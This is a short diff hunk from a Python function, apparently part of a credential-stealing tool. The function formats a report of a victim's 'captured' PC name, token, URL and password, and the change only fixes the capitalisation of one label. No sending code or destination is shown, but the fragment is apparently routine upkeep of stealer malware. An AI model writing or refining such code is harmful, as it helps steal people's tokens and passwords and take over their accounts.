@@ -71,7 +71,7 @@ def on_click_submit():
                 f"💻 **Captured PC Name:** `{pc_name}`\n"
                 f"📥 **Captured Token:**\n```{token}```\n"
                 f"🌐 **Captured URL:**\n```{url}```\n"
-                f"🔐 **captured Generated Password:**\n```{password}```"
+                f"🔐 **Captured Generated Password:**\n```{password}```"
             )
         }
 
